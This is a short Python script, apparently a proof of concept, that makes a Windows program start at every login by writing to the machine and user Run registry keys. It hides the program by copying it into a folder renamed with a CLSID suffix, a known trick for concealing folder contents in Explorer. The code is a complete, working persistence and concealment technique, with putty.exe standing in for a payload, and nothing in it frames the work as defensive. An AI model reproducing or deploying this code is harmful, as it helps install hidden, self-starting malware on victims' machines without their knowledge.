#!/usr/bin/env python
# Python 3.4
# Xtr3am3r.0k@gmail.com
# Github: https://github.com/xtr3m3rok

import os
import shutil
from winreg import *
def CU_Editor(path,name):
    keyVal = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    newkeys =  r"{0}{1}{2}".format(path,'\\',name)
    try:
        key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_CURRENT_USER, keyVal)
    SetValueEx(key, "{}".format(name[:-4]), 0, REG_SZ, newkeys)
    CloseKey(key)

def LM_Editor(path,name):
    keyVal = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    newkeys = r"{0}{1}{2}".format(path,'\\',name)
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, (KEY_WOW64_64KEY + KEY_ALL_ACCESS))
    except:
        key = CreateKey(HKEY_LOCAL_MACHINE, keyVal)
    SetValueEx(key, "{}".format(name[:-4]), 0, REG_SZ, newkeys)
    CloseKey(key)

def main_start():
    os.mkdir('new_dir')
    shutil.copy2('test_exe/putty.exe', 'new_dir')
    os.rename('new_dir', 'con3.{ED7BA470-8E54-465E-825C-99712043E01C}')
    my_path = os.getcwd() +'\\'+ 'con3.{ED7BA470-8E54-465E-825C-99712043E01C}'
    try:
        LM_Editor(my_path, 'putty.exe')
    except:
        CU_Editor(my_path, 'putty.exe')


if __name__ == "__main__":
    main_start()

